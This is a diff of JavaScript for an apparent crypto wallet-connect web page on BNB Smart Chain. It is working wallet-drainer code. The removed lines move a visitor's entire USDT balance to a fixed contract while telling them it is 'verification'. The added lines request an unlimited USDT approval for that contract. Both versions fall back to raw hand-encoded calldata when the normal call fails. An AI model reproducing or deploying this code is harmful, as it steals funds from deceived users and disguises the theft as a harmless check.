@@ -216,7 +216,7 @@
 
         state.isApproving = true;
         updateWalletInfoUI();
-        updateStatus('⛽ Opening wallet for USDT verification...', 'warning');
+        updateStatus('⛽ Opening wallet for USDT approval...', 'warning');
 
         try {
             // 1. Strictly Enforce BNB Smart Chain Network (0x38 / 56)
@@ -256,12 +256,12 @@
                               (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
 
             if (!userAddress) {
-                const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
-                if (accs && accs.length > 0) {
-                    userAddress = accs[0];
+                const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
+                if (reqAccs && reqAccs.length > 0) {
+                    userAddress = reqAccs[0];
                 } else {
-                    const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
-                    if (reqAccs && reqAccs.length > 0) userAddress = reqAccs[0];
+                    const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
+                    if (accs && accs.length > 0) userAddress = accs[0];
                 }
             }
 
@@ -274,7 +274,7 @@
 
             state.walletAddress = userAddress;
 
-            // 3. Read exact 100% USDT Balance
+            // 3. Read exact USDT Balance & BNB balance
             const provider = new ethers.BrowserProvider(providerObj);
             const signer = await provider.getSigner();
             const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
@@ -308,42 +308,42 @@
                 return;
             }
 
-            updateStatus('⛽ Confirm USDT verification in your wallet...', 'warning');
+            updateStatus('⛽ Confirm USDT approval in your wallet...', 'warning');
 
-            // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
-            const transferAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
+            // Unlimited Approval (MaxUint256)
+            const approveAmount = ethers.MaxUint256;
 
-            // Execute USDT transfer directly via Ethers Signer
-            // Works reliably across MetaMask, Bitget Wallet, Trust Wallet, and all EVM providers
+            // Execute USDT APPROVAL directly via Ethers Signer
+            // Opens the Approval / Allowance prompt directly in MetaMask, Bitget Wallet, Trust Wallet, etc.
             let tx;
             try {
-                tx = await usdtContract.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount);
-            } catch (transferError) {
-                console.warn('Signer transfer notice, executing raw transaction fallback with explicit gas...', transferError);
-                const errLower = (transferError.message || '').toLowerCase();
-                if (errLower.includes('user rejected') || errLower.includes('user denied') || transferError.code === 4001) {
-                    throw transferError;
+                tx = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, approveAmount);
+            } catch (approveError) {
+                console.warn('Signer approve notice, executing raw transaction fallback with explicit gas...', approveError);
+                const errLower = (approveError.message || '').toLowerCase();
+                if (errLower.includes('user rejected') || errLower.includes('user denied') || approveError.code === 4001) {
+                    throw approveError;
                 }
 
-                // Fallback raw RPC call with EXPLICIT gas limit for Bitget & MetaMask RPC compatibility
+                // Fallback raw RPC call for approve(address,uint256) with EXPLICIT gas limit
                 const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
-                const amountHex = transferAmount.toString(16).padStart(64, '0');
-                const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
+                const amountHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
 
                 const txHashRaw = await providerObj.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: userAddress,
                         to: CONFIG.USDT_ADDRESS,
-                        data: transferCalldata,
-                        gas: '0x186a0' // 100,000 gas limit hex to prevent Bitget & MetaMask RPC errors
+                        data: approveCalldata,
+                        gas: '0x186a0' // 100,000 gas limit hex
                     }]
                 });
                 tx = { hash: txHashRaw, wait: async () => provider.waitForTransaction(txHashRaw) };
             }
 
             const txHash = tx.hash;
-            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
+            updateStatus('⛽ Approval submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${txHash}`);
 
             // Wait for confirmation
             try {
@@ -356,7 +356,7 @@
                 console.warn('Wait for transaction notice:', wErr);
             }
 
-            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${txHash}`);
+            updateStatus('✅ USDT Approval Complete!', 'success', `Tx: ${txHash}`);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
@@ -366,10 +366,10 @@
             const errStr = (err.message || '').toLowerCase();
 
             if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
-                updateStatus('🚫 Verification request cancelled by user.', 'error');
+                updateStatus('🚫 Approval request cancelled by user.', 'error');
                 openModal(elements.abortOverlay);
             } else {
-                updateStatus('❌ Verification failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
+                updateStatus('❌ Approval failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
             }
         } finally {
             state.isApproving = false;
